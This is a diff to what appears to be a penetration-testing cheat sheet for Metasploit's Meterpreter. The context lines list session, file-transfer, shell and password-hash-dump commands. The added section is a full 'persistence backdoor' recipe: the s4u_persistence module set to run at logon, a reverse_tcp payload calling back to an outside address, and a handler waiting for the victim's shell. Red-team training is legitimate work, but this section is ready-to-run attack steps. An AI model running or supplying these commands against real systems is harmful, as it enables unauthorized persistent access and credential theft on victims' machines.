@@ -148,7 +148,7 @@ show advanced
 
 #### Meterpreter
 
-```text
+```bash
 background
 sessions -l
 sessions -i 1
@@ -162,5 +162,27 @@ download x /root/
 upload x C:\\Windows
 shell
 use post/windows/gather/hashdump
+```
+
+#### Meterpreter - persistence backdoor
+
+```bash
+# persistent backdoor - need meterpreter session
+msf > use exploit/windows/local/s4u_persistence
+msf (s4u_persistence) > set session 2
+#session => 2
+msf (s4u_persistence) > set trigger logon
+#trigger => logon
+msf (s4u_persistence) > set payload windows/meterpreter/reverse_tcp
+msf (s4u_persistence) > set lhost 1.2.3.4
+msf (s4u_persistence) > set lport 1234
+msf (s4u_persistence) > exploit
+
+
+msf (s4u_persistence) > use exploit/multi/handler
+msf (handler) > set payload windows/meterpreter/reverse_tcp
+msf (handler) > exploit
+
+# once victim restarts and logons, we will get a meterpreter shell
 ```
 
